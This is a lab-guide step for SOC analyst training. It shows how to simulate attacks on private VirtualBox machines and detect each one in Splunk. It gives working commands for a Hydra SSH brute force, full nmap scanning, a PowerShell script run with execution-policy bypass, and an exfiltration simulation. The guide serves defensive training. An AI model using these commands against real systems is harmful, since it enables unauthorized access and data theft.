# Step 4 — Simulate Cyber Attacks (Safe Lab Only)

Run these **only** against your VirtualBox guests. Prefer scripts in [`../Scripts/attacks/`](../Scripts/attacks/).

## Attack 1 — Password Brute Force (Hydra)

**Goal:** Many failed SSH logins, then one success.

```bash
# On Kali
cd ~/SOC-Analyst-Lab/Scripts/attacks   # or copy scripts to Kali
chmod +x 01_brute_force_ssh.sh
./01_brute_force_ssh.sh 192.168.56.40 targetuser
```

Manual Hydra:

```bash
hydra -l targetuser -P wordlist-lab.txt ssh://192.168.56.40 -t 4 -V
```

**Detect in Splunk:**

```spl
index=linux sourcetype=linux_secure "Failed password"
| stats count by src_ip, user
```

## Attack 2 — Port Scan (Nmap)

```bash
./02_port_scan.sh 192.168.56.20
./02_port_scan.sh 192.168.56.40
```

Manual:

```bash
nmap -sS -sV -O -p- --min-rate 500 192.168.56.40 -oA ../PCAPs/nmap-target
```

**Detect:** burst of connections from .30 to many ports (Sysmon EID 3 / firewall / PCAP).

## Attack 3 — Suspicious PowerShell (on Victim)

Run as `labuser` on Windows:

```powershell
# From Scripts/attacks/03_suspicious_powershell.ps1
powershell -ExecutionPolicy Bypass -File .\03_suspicious_powershell.ps1
```

Includes encoded command demo and recon-like cmdlets.

**Detect:**

```spl
index=sysmon EventCode=1 Image="*\\powershell.exe*"
| table _time, User, ParentImage, CommandLine
```

## Attack 4 — Data Transfer (Exfil Simulation)

Create a dummy “sensitive” file and copy it off the victim.

```powershell
# On Windows
.\04_data_transfer.ps1 -DestHost 192.168.56.30
```

Or from Kali pull via SCP/SMB if shares are configured:

```bash
./04_exfil_pull.sh 192.168.56.20
```

**Detect:** Sysmon file create + large network connection; Wireshark large TCP stream.

## Capture Evidence

While attacking:

```bash
# Kali
sudo tcpdump -i eth0 -w /tmp/attack-$(date +%Y%m%d).pcapng
```

Copy interesting PCAPs into `PCAPs/` (or keep notes if files are large).

Next: [05-Splunk-Monitoring.md](05-Splunk-Monitoring.md)
